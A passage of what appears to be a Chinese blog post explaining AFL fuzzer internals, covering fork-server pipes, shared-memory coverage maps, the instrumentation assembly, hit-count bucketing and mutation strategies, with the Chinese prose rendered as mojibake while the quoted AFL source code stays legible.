/></p><p>â€‹å›é€€åˆ°<code>calibrate_case</code>ç»§ç»­æ‰§è¡Œï¼Œ<code>write_to_testcase</code>å°±æ˜¯è®¾ç½®æµ‹è¯•æ ·ä¾‹ï¼Œé‡ç‚¹åœ¨äº<code>run_target</code>ã€‚AFLçš„æ–‡ä»¶ç¼–è¯‘ç­–ç•¥ä¸æ˜¯èƒ¡ä¹±å˜æ¢çš„ï¼Œä¸»è¦æ˜¯<code>dumb_mode</code>æœ‰æ²¡æœ‰è¢«å¼€å¯ï¼Œä¸€èˆ¬éƒ½æ˜¯ä¸ä¼šå¼€å¯çš„ï¼Œé‚£ä¹ˆå°±æ¥åˆ°äº†L2362</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  s32 res;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In non-dumb mode, we have the fork server up and running, so simply</span></span><br><span class="line"><span class="comment">     tell it to have at it, and then read back PID. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((res = write(fsrv_ctl_fd, &amp;prev_timed_out, <span class="number">4</span>)) != <span class="number">4</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    RPFATAL(res, <span class="string">&quot;Unable to request new process from fork server (OOM?)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((res = read(fsrv_st_fd, &amp;child_pid, <span class="number">4</span>)) != <span class="number">4</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    RPFATAL(res, <span class="string">&quot;Unable to request new process from fork server (OOM?)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (child_pid &lt;= <span class="number">0</span>) FATAL(<span class="string">&quot;Fork server is misbehaving (OOM?)&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹æ³¨é‡Šå’Œä»£ç ï¼ŒçŸ¥é“é€šè¿‡ç®¡é“å‘forkserveré€šçŸ¥å‡†å¤‡å®Œæ¯•ï¼Œå¹¶å¾—åˆ°è¿”å›çš„PIDï¼Œç„¶åå°±æ˜¯L2438</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (WIFSIGNALED(status) &amp;&amp; !stop_soon) &#123;</span><br><span class="line"></span><br><span class="line">  kill_signal = WTERMSIG(status);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (child_timed_out &amp;&amp; kill_signal == SIGKILL) <span class="keyword">return</span> FAULT_TMOUT;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> FAULT_CRASH;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fuzzerå†æ¬¡è¯»å–çŠ¶æ€ç®¡é“ï¼Œè·å–å­è¿›ç¨‹é€€å‡ºçŠ¶æ€ï¼Œå¹¶ç”±æ­¤æ¥åˆ¤æ–­å­è¿›ç¨‹ç»“æŸçš„åŸå› ï¼Œä¾‹å¦‚æ­£å¸¸é€€å‡ºã€è¶…æ—¶ã€å´©æºƒç­‰ï¼Œå¹¶è¿›è¡Œç›¸åº”çš„è®°å½•</p><h3 id="å…±äº«å†…å­˜æœºåˆ¶"><a class="markdownIt-Anchor" href="#å…±äº«å†…å­˜æœºåˆ¶"></a> å…±äº«å†…å­˜æœºåˆ¶</h3><p>è§£å†³ç¨‹åºæ’æ¡©å’Œå¯åŠ¨è¿è¡Œåï¼Œå°±æ¥åˆ°äº†å¯¹ç¤ºä¾‹çš„fuzzé˜¶æ®µã€‚åœ¨ç¨‹åºå¾…æµ‹è¯•éƒ¨åˆ†ï¼Œç¨‹åºå…ˆæ˜¯åˆå§‹åŒ–å˜å¼‚æ–¹å¼ã€‚AFLé€šè¿‡å…±äº«å†…å­˜æœºåˆ¶æ¥æ–¹ä¾¿é«˜å¹¶å‘çš„æ ·ä¾‹è¯»å–ï¼Œå‡å°IOçš„æŸè€—ã€‚<br />ä»£ç ä¸é•¿è¿™é‡Œè´´ä¸€ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">EXP_ST <span class="type">void</span> <span class="title function_">setup_shm</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">  u8* shm_str;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!in_bitmap) <span class="built_in">memset</span>(virgin_bits, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(virgin_tmout, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line">  <span class="built_in">memset</span>(virgin_crash, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">  shm_id = shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (shm_id &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;shmget() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  atexit(remove_shm);</span><br><span class="line"></span><br><span class="line">  shm_str = alloc_printf(<span class="string">&quot;%d&quot;</span>, shm_id);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If somebody is asking us to fuzz instrumented binaries in dumb mode,</span></span><br><span class="line"><span class="comment">     we don&#x27;t want them to detect instrumentation, since we won&#x27;t be sending</span></span><br><span class="line"><span class="comment">     fork server commands. This should be replaced with better auto-detection</span></span><br><span class="line"><span class="comment">     later on, perhaps? */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!dumb_mode) setenv(SHM_ENV_VAR, shm_str, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  ck_free(shm_str);</span><br><span class="line"></span><br><span class="line">  trace_bits = shmat(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (!trace_bits) PFATAL(<span class="string">&quot;shmat() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>afl-fuzz</code>çš„L7955æ¥åˆ°<code>setup_shm</code>ï¼Œè¿™é‡Œè®¾ç½®å…±äº«å†…å­˜ï¼Œç„¶åä»<code>shemget()</code>ï¼ˆè¿™æ˜¯ä¸€ä¸ªLinuxCçš„å‡½æ•°ï¼‰è·å¾—ä¸€å—å†…å­˜ã€‚</p><blockquote><p>shmget()  returns  the identifier of the System V shared memory segment associated with the value of the arguâ€<br />ment key.  A new shared memory segment, with size equal to the value of size  rounded  up  to  a  multiple  of<br />PAGE_SIZE, is created if key has the value IPC_PRIVATE or key isnâ€™t IPC_PRIVATE, no shared memory segment corâ€<br />responding to key exists, and IPC_CREAT is specified in shmflg.</p></blockquote><p>å­è¿›ç¨‹é€šè¿‡ç¯å¢ƒå˜é‡<code>SHM_ENV_VAR</code>å¾—åˆ°å†…å­˜ï¼Œå¯¹äºfuzzeræœ¬èº«åˆ™ä¼šå›åˆ°<code>trace_bits</code>ä¿å­˜å†…å­˜åœ°å€</p><blockquote><p>shmat()  attaches  the  System V shared memory segment identified by shmid to the address space of the calling<br />process.</p></blockquote><p>æˆ‘ä»¬åœ¨ä¸”å›åˆ°è¢«æµ‹è¯•çš„targetä¸­ï¼Œçœ‹ä¸‹ä»–è¢«æ’æ¡©çš„ä»£ç ï¼ˆæ—©äºä¹‹å‰çš„forkserverï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;  /* Check if SHM region is already mapped. */\n&quot;</span></span><br><span class="line"> <span class="string">&quot;\n&quot;</span></span><br><span class="line"> <span class="string">&quot;  movl  __afl_area_ptr, %edx\n&quot;</span></span><br><span class="line"> <span class="string">&quot;  testl %edx, %edx\n&quot;</span></span><br><span class="line"> <span class="string">&quot;  je    __afl_setup\n&quot;</span></span><br><span class="line"> <span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure><ul><li><p><code>__afl_area_ptr</code>ï¼šå…±äº«å†…å­˜æ˜ å°„åˆ°targetçš„å†…å­˜ç©ºé—´ä¸­çš„åœ°å€</p></li><li><p><code>__afl_setup</code>ï¼šè·å–ç¯å¢ƒå˜é‡<code>AFL_SHM_ENV</code>çš„å†…å®¹å¹¶å°†å…¶è½¬ä¸ºæ•´å‹ï¼Œæœ€åï¼Œé€šè¿‡è°ƒç”¨<code>shmat()</code>ï¼Œtargetå°†è¿™å—å…±äº«å†…å­˜ä¹Ÿæ˜ å°„åˆ°äº†è‡ªå·±çš„å†…å­˜ç©ºé—´ä¸­ï¼Œå¹¶å°†å…¶åœ°å€ä¿å­˜åœ¨<code>__afl_area_ptr</code>åŠ<code>edx</code>ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;__afl_setup:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Do not retry setup if we had previous failures. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  cmpb $0, __afl_setup_failure\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jne  __afl_return\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Map SHM, jumping to __afl_setup_abort if something goes wrong.\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     We do not save FPU/MMX/SSE registers here, but hopefully, nobody\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     will notice this early in the game. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl %eax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl %ecx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $.AFL_SHM_ENV\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  call  getenv\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  addl  $4, %esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  testl %eax, %eax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  je    __afl_setup_abort\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl %eax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  call  atoi\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  addl  $4, %esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $0          /* shmat flags    */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $0          /* requested addr */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl %eax        /* SHM ID         */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  call  shmat\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  addl  $12, %esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  cmpl $-1, %eax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  je   __afl_setup_abort\n&quot;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="åˆ†æ”¯ä¿¡æ¯çš„è®°å½•"><a class="markdownIt-Anchor" href="#åˆ†æ”¯ä¿¡æ¯çš„è®°å½•"></a> åˆ†æ”¯ä¿¡æ¯çš„è®°å½•</h3><p>æ¥åˆ°æ–‡ç« å¼€å§‹æŠ›å‡ºçš„ç–‘é—®<code>__afl_maybe_log</code>å¹²äº†ä»€ä¹ˆ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__afl_maybe_log:\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  lahf\n&quot;</span></span><br><span class="line"><span class="string">&quot;  seto %al\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  /* Check if SHM region is already mapped. */\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movl  __afl_area_ptr, %edx\n&quot;</span></span><br><span class="line"><span class="string">&quot;  testl %edx, %edx\n&quot;</span></span><br><span class="line"><span class="string">&quot;  je    __afl_setup\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;__afl_store:\n&quot;</span></span><br></pre></td></tr></table></figure><p>è¯»ä»£ç å°±çŸ¥é“äº†ï¼š</p><ul><li><p>æ£€æŸ¥å…±äº«å†…å­˜çš„æ˜ å°„ï¼Œæœ‰é”™è¿›å…¥åˆ°<code>__afl_setup</code></p></li><li><p>å¼€å§‹<code>__afl_store</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">  <span class="string">&quot;__afl_store:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Calculate and store hit for the code location specified in ecx. There\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     is a double-XOR way of doing this without tainting another register,\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     and we use it on 64-bit systems; but it&#x27;s slower for 32-bit ones. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> COVERAGE_ONLY</span></span><br><span class="line">  <span class="string">&quot;  movl __afl_prev_loc, %edi\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  xorl %ecx, %edi\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  shrl $1, %ecx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movl %ecx, __afl_prev_loc\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="string">&quot;  movl %ecx, %edi\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^!COVERAGE_ONLY */</span></span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SKIP_COUNTS</span></span><br><span class="line">  <span class="string">&quot;  orb  $1, (%edx, %edi, 1)\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="string">&quot;  incb (%edx, %edi, 1)\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^SKIP_COUNTS */</span></span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure><ul><li><code>__afl_prev_loc</code>ï¼šå‰ä¸€æ¬¡è·³è½¬çš„â€ä½ç½®â€</li><li><code>ecx</code>ï¼šæœ€å¼€å§‹æ’æ¡©çš„éšæœºæ•°ä½ç½®ï¼Œå³ä»£ç å—çš„æ ‡å·</li></ul><blockquote><p>å› æ­¤ï¼ŒAFLä¸ºæ¯ä¸ªä»£ç å—ç”Ÿæˆä¸€ä¸ªéšæœºæ•°ï¼Œä½œä¸ºå…¶â€œä½ç½®â€çš„è®°å½•ï¼›éšåï¼Œå¯¹åˆ†æ”¯å¤„çš„â€æºä½ç½®â€œå’Œâ€ç›®æ ‡ä½ç½®â€œè¿›è¡Œå¼‚æˆ–ï¼Œå¹¶å°†å¼‚æˆ–çš„ç»“æœä½œä¸ºè¯¥åˆ†æ”¯çš„keyï¼Œä¿å­˜æ¯ä¸ªåˆ†æ”¯çš„æ‰§è¡Œæ¬¡æ•°ã€‚ç”¨äºä¿å­˜æ‰§è¡Œæ¬¡æ•°çš„å®é™…ä¸Šæ˜¯ä¸€ä¸ªå“ˆå¸Œè¡¨ï¼Œå¤§å°ä¸º<code>MAP_SIZE=64K</code>ï¼Œå½“ç„¶ä¼šå­˜åœ¨ç¢°æ’çš„é—®é¢˜ï¼›ä½†æ ¹æ®AFLæ–‡æ¡£ä¸­çš„ä»‹ç»ï¼Œå¯¹äºä¸æ˜¯å¾ˆå¤æ‚çš„ç›®æ ‡ï¼Œç¢°æ’æ¦‚ç‡è¿˜æ˜¯å¯ä»¥æ¥å—çš„ï¼š</p></blockquote><p>åœ¨æœ€å<code>map density</code>å°±æ˜¯æŒ‡çš„å“ˆå¸Œè¡¨çš„å¯†åº¦ï¼Œè¶Šå°å‘ç”Ÿç¢°æ’çš„æ¦‚ç‡è¶Šå°</p></li></ul><h3 id="åˆ†æ”¯ä¿¡æ¯çš„åˆ†æ"><a class="markdownIt-Anchor" href="#åˆ†æ”¯ä¿¡æ¯çš„åˆ†æ"></a> åˆ†æ”¯ä¿¡æ¯çš„åˆ†æ</h3><p>å‰æ–‡æåˆ°äº†</p><ul><li><code>trace_bits</code>ä¿å­˜äº†å…±äº«å†…å­˜</li><li>å…±äº«å†…å­˜ä¿å­˜äº†åˆ†æè®°å½•</li></ul><p>é‚£ä¹ˆï¼Œå¯¹äºAFLä»è¿™å—å…±äº«å†…å­˜ä¸­è·å¾—ä¿¡æ¯å°±æ˜¾å¾—å¾ˆåˆç†äº†</p><p>åœ¨é¢„å¤„ç†å…±äº«å†…å­˜æ—¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">classify_counts</span><span class="params">(u32* mem)</span> &#123;</span><br><span class="line"></span><br><span class="line">  u32 i = MAP_SIZE &gt;&gt; <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (i--) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Optimize for sparse bitmaps. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unlikely(*mem)) &#123;</span><br><span class="line"></span><br><span class="line">      u16* mem16 = (u16*)mem;</span><br><span class="line"></span><br><span class="line">      mem16[<span class="number">0</span>] = count_class_lookup16[mem16[<span class="number">0</span>]];</span><br><span class="line">      mem16[<span class="number">1</span>] = count_class_lookup16[mem16[<span class="number">1</span>]];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    mem++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Destructively classify execution counts in a trace. This is used as a</span></span><br><span class="line"><span class="comment">   preprocessing step for any newly acquired traces. Called on every exec,</span></span><br><span class="line"><span class="comment">   must be fast. */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> u8 count_class_lookup8[<span class="number">256</span>] = &#123;</span><br><span class="line"></span><br><span class="line">  [<span class="number">0</span>]           = <span class="number">0</span>,</span><br><span class="line">  [<span class="number">1</span>]           = <span class="number">1</span>,</span><br><span class="line">  [<span class="number">2</span>]           = <span class="number">2</span>,</span><br><span class="line">  [<span class="number">3</span>]           = <span class="number">4</span>,</span><br><span class="line">  [<span class="number">4</span> ... <span class="number">7</span>]     = <span class="number">8</span>,</span><br><span class="line">  [<span class="number">8</span> ... <span class="number">15</span>]    = <span class="number">16</span>,</span><br><span class="line">  [<span class="number">16</span> ... <span class="number">31</span>]   = <span class="number">32</span>,</span><br><span class="line">  [<span class="number">32</span> ... <span class="number">127</span>]  = <span class="number">64</span>,</span><br><span class="line">  [<span class="number">128</span> ... <span class="number">255</span>] = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æœ€é‡è¦çš„æ˜¯<code>count_class_lookup8</code>ï¼Œtargetæ˜¯å°†æ¯ä¸ªåˆ†æ”¯çš„æ‰§è¡Œæ¬¡æ•°ç”¨1ä¸ªbyteæ¥å‚¨å­˜ï¼Œè€Œfuzzeråˆ™è¿›ä¸€æ­¥æŠŠè¿™ä¸ªæ‰§è¡Œæ¬¡æ•°å½’å…¥bucketsä¸­ï¼Œæ¯”å¦‚æ‰§è¡Œ1æ¬¡ï¼Œ<code>mem16 = count_class_lookup8[1]; == 1</code></p><p>æ‰§è¡Œ3æ¬¡<code>mem16 = count_class_lookup8[3]; == 4</code>ã€‚æ‰§è¡Œ4æ¬¡<code>mem16 = count_class_lookup8[4]; == 8</code></p><p>å¥½å¤„å°±åœ¨äºåˆ†æ”¯Aæ‰§è¡Œäº†32æ¬¡ï¼›å¯¹å¦å¤–ä¸€ä¸ªæµ‹è¯•ç”¨ä¾‹ï¼Œåˆ†æ”¯Aæ‰§è¡Œäº†33æ¬¡ï¼Œé‚£ä¹ˆAFLå°±ä¼šè®¤ä¸ºè¿™ä¸¤æ¬¡çš„ä»£ç è¦†ç›–æ˜¯ç›¸åŒçš„ã€‚è¿™æ ·é€šè¿‡ä»£ç å—çš„æ‰§è¡Œæ¬¡æ•°å°±å¯ä»¥ç»Ÿè®¡ç›¸å…³è·¯å¾„ï¼ŒAFLæ ¹æ®ç›¸å…³è·¯å¾„çš„HASHåˆ¤æ–­è·¯å¾„æ˜¯å¦å‘ç”Ÿæ”¹å˜ã€‚</p><h1 id="æ–‡ä»¶å˜å¼‚è§„åˆ™"><a class="markdownIt-Anchor" href="#æ–‡ä»¶å˜å¼‚è§„åˆ™"></a> æ–‡ä»¶å˜å¼‚è§„åˆ™</h1><p>çœ‹åˆ°å¥½å¤šç ”ç©¶ç”Ÿè®ºæ–‡éƒ½æ˜¯ä»è¿™é‡Œä¸‹æ‰‹çš„ã€‚ã€‚ã€‚</p><ul><li><p>bitflipï¼ŒæŒ‰ä½ç¿»è½¬ï¼Œ1å˜ä¸º0ï¼Œ0å˜ä¸º1</p><p>åœ¨å¯¹æ¯ä¸ªbyteè¿›è¡Œç¿»è½¬æ—¶ï¼Œå¦‚æœå…¶é€ æˆæ‰§è¡Œè·¯å¾„ä¸åŸå§‹è·¯å¾„ä¸ä¸€è‡´ï¼Œå°±å°†è¯¥byteåœ¨effector mapä¸­æ ‡è®°ä¸º1ï¼Œå³â€œæœ‰æ•ˆâ€çš„ï¼Œå¦åˆ™æ ‡è®°ä¸º0ï¼Œå³â€œæ— æ•ˆâ€çš„</p></li><li><p>arithmeticï¼Œæ•´æ•°åŠ /å‡ç®—æœ¯è¿ç®—</p><p>å¯¹ç›®æ ‡æ•´æ•°ä¼šè¿›è¡Œ+1, +2, â€¦, +35, -1, -2, â€¦, -35çš„å˜å¼‚ã€‚ç‰¹åˆ«åœ°ï¼Œç”±äºæ•´æ•°å­˜åœ¨å¤§ç«¯åºå’Œå°ç«¯åºä¸¤ç§è¡¨ç¤ºæ–¹å¼ï¼ŒAFLä¼šè´´å¿ƒåœ°å¯¹è¿™ä¸¤ç§æ•´æ•°è¡¨ç¤ºæ–¹å¼éƒ½è¿›è¡Œå˜å¼‚ã€‚</p></li><li><p>interestï¼ŒæŠŠä¸€äº›ç‰¹æ®Šå†…å®¹æ›¿æ¢åˆ°åŸæ–‡ä»¶ä¸­</p><p>ç”¨äºæ›¿æ¢çš„&quot;interesting values&quot;ï¼Œæ˜¯AFLé¢„è®¾çš„ä¸€äº›æ¯”è¾ƒç‰¹æ®Šçš„æ•°ã€‚</p><p><code>config.h</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> INTERESTING_8 \</span></span><br><span class="line"><span class="meta">  -128,          <span class="comment">/* Overflow signed 8-bit when decremented  */</span> \</span></span><br><span class="line"><span class="meta">  -1,            <span class="comment">/*                                         */</span> \</span></span><br><span class="line"><span class="meta">   0,            <span class="comment">/*                                         */</span> \</span></span><br><span class="line"><span class="meta">   1,            <span class="comment">/*                                         */</span> \</span></span><br><span class="line"><span class="meta">   16,           <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   32,           <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   64,           <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   100,          <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   127           <span class="comment">/* Overflow signed 8-bit when incremented  */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INTERESTING_16 \</span></span><br><span class="line"><span class="meta">  -32768,        <span class="comment">/* Overflow signed 16-bit when decremented */</span> \</span></span><br><span class="line"><span class="meta">  -129,          <span class="comment">/* Overflow signed 8-bit                   */</span> \</span></span><br><span class="line"><span class="meta">   128,          <span class="comment">/* Overflow signed 8-bit                   */</span> \</span></span><br><span class="line"><span class="meta">   255,          <span class="comment">/* Overflow unsig 8-bit when incremented   